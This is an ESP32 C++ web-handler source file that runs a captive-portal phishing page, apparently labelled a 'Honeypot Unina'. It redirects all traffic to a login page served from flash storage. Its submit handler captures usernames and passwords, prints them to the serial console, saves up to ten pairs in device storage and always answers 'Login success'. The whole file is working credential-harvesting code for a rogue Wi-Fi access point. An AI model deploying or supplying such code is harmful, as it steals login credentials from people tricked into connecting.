#include "web_handler.h"

#include <WiFi.h>
#include <WebServer.h>
#include <SPIFFS.h> // used to load page
#include <Preferences.h>

Preferences preferences;
#define MAX_CREDENTIALS 10

void setup_web_handler() {
    http_server.on("/", main_handler);
    http_server.on("/submit", submit_handler);
    http_server.on("/shutdown", shutdown_handler);
    http_server.onNotFound(captive_portal);

    // file handlers for use html page from files
    http_server.serveStatic("/styles.css", SPIFFS, "/styles.css");
    http_server.serveStatic("/script.js", SPIFFS, "/script.js");
    http_server.serveStatic("/logo.png", SPIFFS, "/logo.png");
    http_server.serveStatic("/bg.jpg", SPIFFS, "/bg.jpg");
}

void captive_portal() {   
    http_server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
    http_server.send(302, "text/plain", ""); 
}

void main_handler() {
    File file = SPIFFS.open("/index.html", "r");
    if (!file || file.isDirectory()) {
        http_server.send(500, "text/plain", "Login page not found");
        return;
    }
    http_server.streamFile(file, "text/html");
    file.close();
}

void submit_handler() {
    if (http_server.method() == HTTP_POST) {
        String username = http_server.arg("username");
        String password = http_server.arg("password");

        preferences.begin("creds", false);
        int count = preferences.getUInt("count", 0);

        Serial.print("Username: ");
        Serial.println(username);
        Serial.print("Password: ");
        Serial.println(password);

        if (count < MAX_CREDENTIALS) {
            preferences.putString("user" + String(count), username);
            preferences.putString("pass" + String(count), password);
            preferences.putUInt("count", count + 1);
            Serial.printf("Saved credentials #%d\n", count);
        } else {
            Serial.println("Credential storage full");
        }

        preferences.end();

        http_server.send(200, "text/plain", "Login success");
    } else {
        http_server.send(405, "text/plain", "Method Not Allowed");
    }
}

void shutdown_handler() {
    http_server.send(200, "text/plain", "Shutting down the Honeypot Unina...");
    delay(1000); 
    ESP.deepSleep(0); 
}
